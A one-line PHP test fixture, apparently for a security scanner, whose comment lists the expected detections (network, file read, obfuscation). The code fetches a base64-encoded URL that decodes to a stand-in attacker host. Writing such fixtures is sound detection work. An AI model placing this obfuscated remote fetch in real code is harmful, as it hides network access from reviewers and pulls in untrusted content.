<?php
// @expect: NETWORK, FILE_READ, OBFUSCATION
file_get_contents(base64_decode('aHR0cHM6Ly9ldmlsLmV4YW1wbGUv'));
